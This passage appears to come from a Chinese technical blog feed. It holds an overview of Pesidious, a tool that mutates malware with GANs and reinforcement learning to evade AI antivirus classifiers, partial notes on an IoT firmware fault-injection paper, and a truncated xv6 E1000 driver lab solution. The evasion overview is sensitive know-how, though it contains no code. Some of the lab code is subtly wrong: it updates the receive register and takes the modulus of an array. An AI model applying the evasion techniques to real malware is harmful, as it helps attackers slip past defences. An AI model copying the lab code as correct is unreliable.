    <content type="html"><![CDATA[<h1 id="Pesidious"><a href="#Pesidious" class="headerlink" title="Pesidious"></a>Pesidious</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction:"></a>Introduction:</h2><p>Pesidious 是一款开源工具，它使用生成对抗网络 (GAN) 和强化学习 (RL) 来生成可以逃避下一代人工智能防病毒扫描程序的变异恶意软件。</p><ul><li>样本恶意软件分类器：该工具经过训练可以变异恶意软件，从而可以逃避使用梯度增强算法对恶意软件和良性文件进行分类的样本分类器。</li><li>GAN 生成看起来良性的部分和导入：GAN 已用于生成可以使恶意软件看起来更良性的部分和导入。</li><li>强化学习模型：强化学习模型经过训练，可以选择最佳的突变序列，包括上述部分和导入内容以及其他部分，以欺骗恶意软件分类器。</li></ul><p><img src="/../images/Pesidious/%E6%88%AA%E5%B1%8F2024-04-12%2016.18.32.png" alt="截屏2024-04-12 16.18.32"></p><h2 id="Train-Models-optional"><a href="#Train-Models-optional" class="headerlink" title="Train Models (optional)"></a>Train Models (optional)</h2><p>该工具使用两种模型来变异恶意软件，以增加规避性并维护功能。</p><ul><li>生成对抗网络用于为恶意软件样本生成看起来良性的导入和部分。</li><li>强化学习用于训练代理为恶意软件样本选择最佳突变序列，以逃避分类器。</li></ul><h3 id="Step-1-Train-Generative-Adversarial-Network-GAN"><a href="#Step-1-Train-Generative-Adversarial-Network-GAN" class="headerlink" title="Step 1: Train Generative Adversarial Network (GAN)"></a>Step 1: Train Generative Adversarial Network (GAN)</h3><p>生成对抗性网络训练模型可以分为以下部分：</p><p><strong>Feature Extraction Component（特征提取组件）</strong>: </p><p>特征提取组件对于让我们的人工智能模型理解二进制文件所拥有的特征的更简单表示至关重要。</p><p><strong>特征</strong> - 提取出的二进制文件中最相关的组成部分包括：</p><ul><li><strong>节名称（Section names）</strong></li><li><strong>导入库和函数（Import libraries and functions）</strong></li></ul><p><strong>特征向量映射（Feature Vector Map）</strong>- 所有独特的特征都被存储在一个映射中。</p><p><strong>二进制特征向量（Binary Feature Vectors）</strong>- 随后，二进制文件通过使用特征向量映射被转换为二进制表示形式。</p><p><strong>Table 1: Simplified representation of feature vector map</strong></p><table><thead><tr><th>Feature</th><th>Index</th></tr></thead><tbody><tr><td>ConversionListA : inn32.dll</td><td>1</td></tr><tr><td>OdQueryStringA : user32.dll</td><td>2</td></tr><tr><td>GetTabbedTextExtentA : user32.dll</td><td>3</td></tr><tr><td>…</td><td>4</td></tr><tr><td>…</td><td>5</td></tr><tr><td>…</td><td>6</td></tr><tr><td><function_name><dll name></td><td>7</td></tr></tbody></table><p><strong>Table 2: Simplified representation of a binary feature vector</strong></p><table><thead><tr><th>Feature Index</th><th>Boolean</th></tr></thead><tbody><tr><td>1</td><td>1</td></tr><tr><td>2</td><td>0</td></tr><tr><td>3</td><td>0</td></tr><tr><td></td><td>1</td></tr><tr><td></td><td>1</td></tr><tr><td></td><td>0</td></tr><tr><td><feature_index></td><td>&lt;Exist&#x2F;Doesn’t Exist&gt;</td></tr></tbody></table><p> <strong>Adversarial Features Generation Component（对抗性特征生成组件）</strong>:</p><p>一旦我们对二进制文件有了更简单的表示，我们就可以用它来训练我们的生成对抗网络（GAN）。我们的GAN包括三个组成部分：</p><ul><li><strong>生成器</strong> - 这是一个人工智能模型，负责生成看起来良性的特征，同时尝试保留恶意功能。</li><li><strong>检测器</strong> - 这是一个人工智能模型，负责检测生成器输出的内容是恶意的还是良性的。然后检测器向生成器提供反馈，以便它在下一次迭代中进行改进。</li><li><strong>黑盒检测器</strong> - 这个组件使用在杀毒软件中用于分类生成器输出的人工智能模型进行训练，帮助检测器做出决策。</li></ul><h3 id="Step-2-Train-Reinforcement-Learning-RL-Agent"><a href="#Step-2-Train-Reinforcement-Learning-RL-Agent" class="headerlink" title="Step 2: Train Reinforcement Learning (RL) Agent"></a>Step 2: Train Reinforcement Learning (RL) Agent</h3><p>强化学习训练模块将包括以下内容：</p><ul><li><strong>恶意软件环境</strong> - 这是一个将帮助代理通过代理选择的变异来分类和评分变异样本的环境。</li><li><strong>代理</strong> - 一个神经网络模型，学习恶意软件样本的变异序列，这些变异可以逃避分类器的检测。</li><li><strong>突变</strong> - 当前工具中可用的各种变异如下：<ul><li>添加导入（查询GAN模型）</li><li>添加节（查询GAN模型）</li><li>向节中追加字节</li><li>重命名节</li><li>UPX打包</li><li>UPX解包</li><li>添加&#x2F;删除签名</li><li>追加随机数量的字节</li></ul></li><li><strong>分类器</strong> - 一个人工智能模型，能够接收一个二进制文件作为输入，并将其分类为恶意软件或良性文件。默认情况下，该工具使用一个样本梯度提升分类器。</li></ul><h2 id="Mutate-Malware"><a href="#Mutate-Malware" class="headerlink" title="Mutate Malware"></a>Mutate Malware</h2><p>这个工具可以用来创建能够逃避基于人工智能的分类器检测的变异恶意软件。</p><h3 id="Step-1-Get-the-original-scores-of-malware-samples-获取恶意软件样本的原始分数"><a href="#Step-1-Get-the-original-scores-of-malware-samples-获取恶意软件样本的原始分数" class="headerlink" title="Step 1: Get the original scores of malware samples 获取恶意软件样本的原始分数"></a>Step 1: Get the original scores of malware samples 获取恶意软件样本的原始分数</h3><p>为了评估工具生成的变异恶意软件的逃避能力，你可以首先使用分类器对恶意软件样本进行测试。</p><h3 id="Step-2-Mutate-malware-files-突变恶意文件"><a href="#Step-2-Mutate-malware-files-突变恶意文件" class="headerlink" title="Step 2: Mutate malware files 突变恶意文件"></a>Step 2: Mutate malware files 突变恶意文件</h3><p>这个工具配备了预训练模型，可以变异恶意软件以逃避内置的分类器。</p><h3 id="Step-3-Check-the-score-for-mutated-malware-检查变异后的恶意软件的分数"><a href="#Step-3-Check-the-score-for-mutated-malware-检查变异后的恶意软件的分数" class="headerlink" title="Step 3: Check the score for mutated malware 检查变异后的恶意软件的分数"></a>Step 3: Check the score for mutated malware 检查变异后的恶意软件的分数</h3><p>您可以再次运行分类器，但要对抗突变的恶意软件，并将其与第一步中检索到的原始分数进行比较 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pesidious&quot;&gt;&lt;a href=&quot;#Pesidious&quot; class=&quot;headerlink&quot; title=&quot;Pesidious&quot;&gt;&lt;/a&gt;Pesidious&lt;/h1&gt;&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ifizz</title>
    <link href="http://example.com/2024/03/24/ifizz/"/>
    <id>http://example.com/2024/03/24/ifizz/</id>
    <published>2024-03-24T05:34:51.000Z</published>
    <updated>2024-03-26T10:38:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IFIZZ-Deep-State-and-Efficient-Fault-Scenario-Generation-to-Test-IoT-Firmware"><a href="#IFIZZ-Deep-State-and-Efficient-Fault-Scenario-Generation-to-Test-IoT-Firmware" class="headerlink" title="IFIZZ: Deep-State and Efficient Fault-Scenario Generation to Test IoT Firmware"></a>IFIZZ: Deep-State and Efficient Fault-Scenario Generation to Test IoT Firmware</h1><h2 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h2><ul><li>错误处理代码<code>(error-handling code)</code>由于难以被测试，其本身就是error-prone的</li><li>错误处理代码中的<code>bug</code>由于难以被探测，可能持续存在很长一段时间。</li><li>虽然已经存在像<code>fuzzing</code>的动态探测方法，但是他们在处理由输入无关错误触发的bug时有很大的局限性</li></ul><h2 id="问题：设计一个有效的错误注入方法用于测试IoT固件中的错误检测代码"><a href="#问题：设计一个有效的错误注入方法用于测试IoT固件中的错误检测代码" class="headerlink" title="问题：设计一个有效的错误注入方法用于测试IoT固件中的错误检测代码"></a>问题：设计一个有效的错误注入方法用于测试<code>IoT</code>固件中的错误检测代码</h2><ul><li><h3 id="挑战一：自动识别输入无关错误"><a href="#挑战一：自动识别输入无关错误" class="headerlink" title="挑战一：自动识别输入无关错误"></a>挑战一：自动识别输入无关错误</h3></li><li><h3 id="挑战二：测试深度的错误路径"><a href="#挑战二：测试深度的错误路径" class="headerlink" title="挑战二：测试深度的错误路径"></a>挑战二：测试深度的错误路径</h3></li></ul><h2 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h2><h3 id="自动鉴别输入无关错误："><a href="#自动鉴别输入无关错误：" class="headerlink" title="自动鉴别输入无关错误："></a>自动鉴别输入无关错误：</h3><ul><li>观察一：错误代码作为返回值，并且将会在调用函数中检查。</li><li></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IFIZZ-Deep-State-and-Efficient-Fault-Scenario-Generation-to-Test-IoT-Firmware&quot;&gt;&lt;a href=&quot;#IFIZZ-Deep-State-and-Efficient-Fault-Scenar</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Lab: networking</title>
    <link href="http://example.com/2024/03/16/Lab-networking/"/>
    <id>http://example.com/2024/03/16/Lab-networking/</id>
    <published>2024-03-16T01:34:05.000Z</published>
    <updated>2024-03-17T04:58:11.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lab-networking"><a href="#Lab-networking" class="headerlink" title="Lab: networking"></a>Lab: networking</h1><p>这个实验需要写一个<code>xv6</code>网络接口卡的设备驱动器。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>你需要使用E1000网络设备处理网络通信。对于xv6来说，E1000看起来就像是连接到真实以太网据局域网（LAN）的真实硬件。实际上，你的驱动程序将于之通信的E1000是由qemu提供的仿真，连接到的也是一个由qemu提供的仿真局域网。在这个仿真局域网上，xv6（作为客户机）的ip地址为10.0.2.15。qemu还安排运行qemu的计算机出现在局域网上，IP地址为10.0.2.2。当xv6使用E1000向10.0.2.2发送数据包时，qemu会将数据包递送到运行qemu的（真实）计算机上的适当应用程序（“宿主机”）。</p><p>你将使用qemu的用户模式网络栈。Qemu的文档有更多关于user-mode stack的信息。Makefile已经更新并支持QEMU的用户模式网络栈和E1000网卡。</p><p>Makefile 配置了 QEMU，以便将所有进出的数据包记录到实验目录中的 packets.pcap 文件。查看这些记录文件可能有助于确认 xv6 是否发送和接收了你期望的数据包。要显示记录的数据包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -XXnr packets.pcap</span><br></pre></td></tr></table></figure><p>为了这个实验，我们在 xv6 仓库中添加了一些文件。文件 <code>kernel/e1000.c</code> 包含了 E1000 的初始化代码，以及用于发送和接收数据包的空函数，你将填充这些函数。<code>kernel/e1000_dev.h</code> 包含由 E1000 定义的寄存器和标志位的定义，这些定义在 Intel E1000 软件开发者手册中有描述。<code>kernel/net.c</code> 和 <code>kernel/net.h</code> 包含了一个简单的网络栈，实现了 IP、UDP 和 ARP 协议。这些文件还包含了一种用于存放数据包的灵活数据结构的代码，称为 mbuf。最后，<code>kernel/pci.c</code> 包含了在 xv6 启动时搜索 PCI 总线上的 E1000 卡的代码。</p><h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>你的任务是完成 <code>kernel/e1000.c</code> 中的 <code>e1000_transmit()</code> 和 <code>e1000_recv()</code> 函数，使得驱动程序能够发送和接收数据包。当 <code>make grade</code> 显示你的解决方案通过了所有测试时，说明你已经完成了任务。</p><blockquote><p>在编写代码时，你会发现自己需要参考 E1000 软件开发者手册。以下几个部分可能特别有帮助：</p><ul><li>第2节是必不可少的，提供了整个设备的概览。</li><li>第3.2节提供了数据包接收的概览。</li><li>第3.3节和第3.4节一起提供了数据包传输的概览。</li><li>第13节提供了 E1000 使用的寄存器的概览。</li><li>第14节可能会帮助你理解我们提供的初始化代码。</li></ul></blockquote><p>浏览 E1000 软件开发者手册。这份手册涵盖了几个密切相关的以太网控制器。QEMU 模拟的是 82540EM。现在先浏览第2章，以对设备有一个基本了解。为了编写你的驱动程序，你需要熟悉第3章和第14章，以及第4.1章（但不包括4.1章的小节）。你还需要将第13章作为参考。其他章节主要涵盖了你的驱动程序不需要交互的 E1000 的组件。首先不用担心细节；只需了解文档的结构，以便稍后可以找到所需的信息。E1000 有许多高级功能，其中大部分你可以忽略。只需要一小部分基本功能就可以完成这个实验。</p><p>我们在 <code>e1000.c</code> 中提供给你的 <code>e1000_init()</code> 函数配置了 E1000 从 RAM 读取要传输的数据包，并将接收到的数据包写入 RAM。这种技术称为 DMA，即直接内存访问，指的是 E1000 硬件直接向 RAM 读写数据包的事实。</p><p>由于数据包的突发可能比驱动程序能够处理的更快地到达，<code>e1000_init()</code> 为 E1000 提供了多个缓冲区，E1000 可以将数据包写入这些缓冲区。E1000 要求这些缓冲区通过 RAM 中的一个“描述符”数组来描述；每个描述符包含一个 RAM 中的地址，E1000 可以将接收到的数据包写入该地址。<code>struct rx_desc</code> 描述了描述符的格式。描述符数组被称为接收环或接收队列。从环形的角度来说，当卡或驱动到达数组的末尾时，它会回到开始的位置。<code>e1000_init()</code> 使用 <code>mbufalloc()</code> 为 E1000 分配 <code>mbuf</code> 数据包缓冲区以便 DMA 使用。还有一个发送环，驱动程序应将其希望 E1000 发送的数据包放置在其中。<code>e1000_init()</code> 配置这两个环的大小为 <code>RX_RING_SIZE</code> 和 <code>TX_RING_SIZE</code>。</p><p>当 <code>net.c</code> 中的网络栈需要发送数据包时，它会调用 <code>e1000_transmit()</code> 函数，并传入一个包含待发送数据包的 <code>mbuf</code>。你的传输代码必须将指向数据包数据的指针放置在 TX（发送）环的一个描述符中。<code>struct tx_desc</code> 描述了描述符的格式。你需要确保每个 <code>mbuf</code> 最终都被释放，但只有在 E1000 完成数据包传输后才能这么做（E1000 通过在描述符中设置 <code>E1000_TXD_STAT_DD</code> 位来指示这一点）。</p><p>当 E1000 从以太网接收到每个数据包时，它会通过直接内存访问（DMA）将数据包传输到 RX（接收）环描述符中的下一个 <code>addr</code> 指向的内存。如果 E1000 中断尚未挂起，E1000 会请求 PLIC 在启用中断后尽快交付一个中断。你的 <code>e1000_recv()</code> 代码必须扫描 RX 环，并通过调用 <code>net_rx()</code> 将每个新数据包的 <code>mbuf</code> 交给 <code>net.c</code> 中的网络栈。然后，你需要分配一个新的 <code>mbuf</code> 并将其放入描述符中，以便当 E1000 再次到达 RX 环的那一点时，它找到一个新的缓冲区，可以将新数据包通过 DMA 传输进去。</p><p>除了在 RAM 中读写描述符环，你的驱动程序还需要通过内存映射的控制寄存器与 E1000 交互，以检测何时有接收到的数据包可用，并通知 E1000 驱动程序已经填充了一些 TX 描述符，准备发送数据包。全局变量 <code>regs</code> 保存了一个指向 E1000 第一个控制寄存器的指针；你的驱动程序可以通过将 <code>regs</code> 作为数组进行索引来访问其他寄存器。你特别需要使用索引 <code>E1000_RDT</code> 和 <code>E1000_TDT</code>。</p><p>为了测试你的驱动程序，在一个窗口中运行 <code>make server</code>，在另一个窗口运行 <code>make qemu</code>，然后在 xv6 中运行 <code>nettests</code>。<code>nettests</code> 中的第一个测试尝试向宿主操作系统发送一个 UDP 数据包，地址指向 <code>make server</code> 运行的程序。如果你还没有完成实验，E1000 驱动程序实际上不会发送数据包，因此几乎没有什么会发生。</p><p>完成实验后，E1000 驱动程序将发送数据包，qemu 将把它传送到你的宿主计算机，<code>make server</code> 将看到它，它将发送一个响应数据包，然后 E1000 驱动程序和 <code>nettests</code> 将看到响应数据包。然而，在宿主发送回复之前，它会向 xv6 发送一个“ARP”请求数据包，以找出其 48 位以太网地址，并期望 xv6 用 ARP 回复进行响应。一旦你完成了 E1000 驱动程序的工作，<code>kernel/net.c</code> 将处理这个问题。如果一切顺利，<code>nettests</code> 将打印 <code>testing ping: OK</code>，而 <code>make server</code> 将打印一条来自 xv6 的消息！</p><p>tcpdump -XXnr packets.pcap should produce output that starts like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">reading from file packets.pcap, link-type EN10MB (Ethernet)</span><br><span class="line">15:27:40.861988 IP 10.0.2.15.2000 &gt; 10.0.2.2.25603: UDP, length 19</span><br><span class="line">        0x0000:  ffff ffff ffff 5254 0012 3456 0800 4500  ......RT..4V..E.</span><br><span class="line">        0x0010:  002f 0000 0000 6411 3eae 0a00 020f 0a00  ./....d.&gt;.......</span><br><span class="line">        0x0020:  0202 07d0 6403 001b 0000 6120 6d65 7373  ....d.....a.mess</span><br><span class="line">        0x0030:  6167 6520 6672 6f6d 2078 7636 21         age.from.xv6!</span><br><span class="line">15:27:40.862370 ARP, Request who-has 10.0.2.15 tell 10.0.2.2, length 28</span><br><span class="line">        0x0000:  ffff ffff ffff 5255 0a00 0202 0806 0001  ......RU........</span><br><span class="line">        0x0010:  0800 0604 0001 5255 0a00 0202 0a00 0202  ......RU........</span><br><span class="line">        0x0020:  0000 0000 0000 0a00 020f                 ..........</span><br><span class="line">15:27:40.862844 ARP, Reply 10.0.2.15 is-at 52:54:00:12:34:56, length 28</span><br><span class="line">        0x0000:  ffff ffff ffff 5254 0012 3456 0806 0001  ......RT..4V....</span><br><span class="line">        0x0010:  0800 0604 0002 5254 0012 3456 0a00 020f  ......RT..4V....</span><br><span class="line">        0x0020:  5255 0a00 0202 0a00 0202                 RU........</span><br><span class="line">15:27:40.863036 IP 10.0.2.2.25603 &gt; 10.0.2.15.2000: UDP, length 17</span><br><span class="line">        0x0000:  5254 0012 3456 5255 0a00 0202 0800 4500  RT..4VRU......E.</span><br><span class="line">        0x0010:  002d 0000 0000 4011 62b0 0a00 0202 0a00  .-....@.b.......</span><br><span class="line">        0x0020:  020f 6403 07d0 0019 3406 7468 6973 2069  ..d.....4.this.i</span><br><span class="line">        0x0030:  7320 7468 6520 686f 7374 21              s.the.host!</span><br></pre></td></tr></table></figure><p>你的输出会有些不同，但它应该包含字符串 “ARP, Request”（ARP 请求），”ARP, Reply”（ARP 回复），”UDP”，”a.message.from.xv6” 和 “this.is.the.host”。</p><p><code>nettests</code> 还执行了一些其他测试，最终通过（真实的）互联网向谷歌的某个域名服务器发送了一个 DNS 请求。你应该确保你的代码通过了所有这些测试，之后你应该会看到以下输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nettests</span><br><span class="line">nettests running on port 25603</span><br><span class="line">testing ping: OK</span><br><span class="line">testing single-process pings: OK</span><br><span class="line">testing multi-process pings: OK</span><br><span class="line">testing DNS</span><br><span class="line">DNS arecord for pdos.csail.mit.edu. is 128.52.129.126</span><br><span class="line">DNS OK</span><br><span class="line">all tests passed.</span><br></pre></td></tr></table></figure><p>你应该确保让分数同意你的解决方案通过。</p><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>首先，在 <code>e1000_transmit()</code> 和 <code>e1000_recv()</code> 中添加打印语句，然后运行 <code>make server</code> 和（在 xv6 中）<code>nettests</code>。你应该从打印语句中看到 <code>nettests</code> 生成了对 <code>e1000_transmit</code> 的调用。实现 <code>e1000_transmit</code> 的一些提示：</p><ol><li>首先询问 E1000 下一个期望的数据包将放在 TX 环的哪个索引位置，通过读取 <code>E1000_TDT</code> 控制寄存器来实现。</li><li>然后检查环是否溢出。如果 <code>E1000_TDT</code> 索引的描述符中没有设置 <code>E1000_TXD_STAT_DD</code>，则 E1000 尚未完成相应的之前的传输请求，因此返回一个错误。</li><li>否则，使用 <code>mbuffree()</code> 释放从该描述符传输的最后一个 <code>mbuf</code>（如果有的话）。</li><li>然后填写描述符。<code>m-&gt;head</code> 指向内存中数据包的内容，<code>m-&gt;len</code> 是数据包长度。设置必要的 cmd 标志（查看 E1000 手册的第 3.3 节）并保存一个指向 <code>mbuf</code> 的指针以便以后释放。</li><li>最后，通过向 <code>E1000_TDT</code> 加一模 <code>TX_RING_SIZE</code> 来更新环位置。</li><li>如果 <code>e1000_transmit()</code> 成功将 <code>mbuf</code> 添加到环中，则返回 0。如果失败（例如，没有可用的描述符来传输 <code>mbuf</code>），则返回 -1，以便调用者知道要释放 <code>mbuf</code>。</li></ol><p>实现 <code>e1000_recv</code> 的一些提示：</p><ol><li>首先通过获取 <code>E1000_RDT</code> 控制寄存器并加一模 <code>RX_RING_SIZE</code> 来询问 E1000 下一个等待接收的数据包（如果有的话）位于环的哪个索引位置。</li><li>然后通过检查描述符的状态部分中的 <code>E1000_RXD_STAT_DD</code> 位来检查是否有新数据包可用。如果没有，停止。</li><li>否则，将 <code>mbuf</code> 的 <code>m-&gt;len</code> 更新为描述符报告的长度。使用 <code>net_rx()</code> 将 <code>mbuf</code> 交给网络栈。</li><li>然后使用 <code>mbufalloc()</code> 分配一个新的 <code>mbuf</code> 来替换刚刚给 <code>net_rx()</code> 的那个。将其数据指针（<code>m-&gt;head</code>）编程到描述符中。将描述符的状态位清零。</li><li>最后，将 <code>E1000_RDT</code> 寄存器更新为最后处理的环描述符的索引。</li></ol><p><code>e1000_init()</code> 使用 <code>mbufs</code> 初始化 RX 环，你将需要查看它是如何做到的，并可能借用代码。在某个时刻，到达的数据包总数将超过环的大小（16）；确保你的代码能够处理这个情况。你将需要锁来应对 xv6 可能从多个进程使用 E1000，或者在中断到达时在内核线程中使用 E1000 的可能性。</p><h2 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h2><p>跟着提示一步一步的走就好</p><h3 id="E1000-transmit"><a href="#E1000-transmit" class="headerlink" title="E1000_transmit"></a>E1000_transmit</h3><h4 id="1-首先询问-E1000-下一个期望的数据包将放在-TX-环的哪个索引位置，通过读取-E1000-TDT-控制寄存器来实现。"><a href="#1-首先询问-E1000-下一个期望的数据包将放在-TX-环的哪个索引位置，通过读取-E1000-TDT-控制寄存器来实现。" class="headerlink" title="1.首先询问 E1000 下一个期望的数据包将放在 TX 环的哪个索引位置，通过读取 E1000_TDT 控制寄存器来实现。"></a>1.首先询问 E1000 下一个期望的数据包将放在 TX 环的哪个索引位置，通过读取 <code>E1000_TDT</code> 控制寄存器来实现。</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">acquire(&amp;e1000_lock); <span class="comment">// 请求锁</span></span><br><span class="line"><span class="type">int</span> index = regs[E1000_TDT]; <span class="comment">// 寄存器 E1000_TDT 中存储了第一个软件可以写入的描述符的位置</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tx_desc</span> * <span class="title">tail_desc</span> =</span> &amp; tx_ring[index]; <span class="comment">// 拿到可用的文件描述符</span></span><br></pre></td></tr></table></figure><h4 id="2-然后检查环是否溢出。如果-E1000-TDT-索引的描述符中没有设置-E1000-TXD-STAT-DD，则-E1000-尚未完成相应的之前的传输请求，因此返回一个错误。"><a href="#2-然后检查环是否溢出。如果-E1000-TDT-索引的描述符中没有设置-E1000-TXD-STAT-DD，则-E1000-尚未完成相应的之前的传输请求，因此返回一个错误。" class="headerlink" title="2.然后检查环是否溢出。如果 E1000_TDT 索引的描述符中没有设置 E1000_TXD_STAT_DD，则 E1000 尚未完成相应的之前的传输请求，因此返回一个错误。"></a>2.然后检查环是否溢出。如果 <code>E1000_TDT</code> 索引的描述符中没有设置 <code>E1000_TXD_STAT_DD</code>，则 E1000 尚未完成相应的之前的传输请求，因此返回一个错误。</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((tail_desc-&gt;status &amp; E1000_TXD_STAT_DD) == <span class="number">0</span>) &#123; </span><br><span class="line">  release(&amp;e1000_lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-否则，使用-mbuffree-释放从该描述符传输的最后一个-mbuf（如果有的话）。"><a href="#3-否则，使用-mbuffree-释放从该描述符传输的最后一个-mbuf（如果有的话）。" class="headerlink" title="3.否则，使用 mbuffree() 释放从该描述符传输的最后一个 mbuf（如果有的话）。"></a>3.否则，使用 <code>mbuffree()</code> 释放从该描述符传输的最后一个 <code>mbuf</code>（如果有的话）。</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(tx_mbufs[index]) &#123;</span><br><span class="line">  mbuffree(tx_mbufs[index]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-然后填写描述符。m-gt-head-指向内存中数据包的内容，m-gt-len-是数据包长度。设置必要的-cmd-标志（查看-E1000-手册的第-3-3-节）并保存一个指向-mbuf-的指针以便以后释放。"><a href="#4-然后填写描述符。m-gt-head-指向内存中数据包的内容，m-gt-len-是数据包长度。设置必要的-cmd-标志（查看-E1000-手册的第-3-3-节）并保存一个指向-mbuf-的指针以便以后释放。" class="headerlink" title="4.然后填写描述符。m-&gt;head 指向内存中数据包的内容，m-&gt;len 是数据包长度。设置必要的 cmd 标志（查看 E1000 手册的第 3.3 节）并保存一个指向 mbuf 的指针以便以后释放。"></a>4.然后填写描述符。<code>m-&gt;head</code> 指向内存中数据包的内容，<code>m-&gt;len</code> 是数据包长度。设置必要的 cmd 标志（查看 E1000 手册的第 3.3 节）并保存一个指向 <code>mbuf</code> 的指针以便以后释放。</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tail_desc-&gt;length = m-&gt;len; <span class="comment">// 数据包的长度</span></span><br><span class="line">tail_desc-&gt;addr = (uint64)m-&gt;head; <span class="comment">// 数据包在缓存中的起始位置</span></span><br><span class="line">tail_desc-&gt;cmd |= E1000_TXD_CMD_EOP | E1000_TXD_CMD_RS; <span class="comment">// cmd位，end of packet, report status</span></span><br></pre></td></tr></table></figure><h4 id="5-最后，将-E1000-RDT-寄存器更新为最后处理的环描述符的索引。"><a href="#5-最后，将-E1000-RDT-寄存器更新为最后处理的环描述符的索引。" class="headerlink" title="5.最后，将 E1000_RDT 寄存器更新为最后处理的环描述符的索引。"></a>5.最后，将 <code>E1000_RDT</code> 寄存器更新为最后处理的环描述符的索引。</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regs[E1000_RDT] = (index + <span class="number">1</span>) % tx_ring; <span class="comment">// 更新index</span></span><br><span class="line">release(&amp;e1000_lock); <span class="comment">// 释放锁</span></span><br></pre></td></tr></table></figure><h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">e1000_transmit</span><span class="params">(<span class="keyword">struct</span> mbuf *m)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Your code here.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// the mbuf contains an ethernet frame; program it into</span></span><br><span class="line">  <span class="comment">// the TX descriptor ring so that the e1000 sends it. Stash</span></span><br><span class="line">  <span class="comment">// a pointer so that it can be freed after sending.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  acquire(&amp;e1000_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * todo: ask the E1000 for the TX ring index at which it&#x27;s expecting the next packet</span></span><br><span class="line"><span class="comment">   * E1000_TDT 指向 tx_ring 中下一个可以被分配的 descriptor 的索引</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">int</span> index = regs[E1000_TDT];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tx_desc</span>* <span class="title">tail_desc</span> =</span> &amp;tx_ring[index];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * todo: check if the ring is overflow</span></span><br><span class="line"><span class="comment">   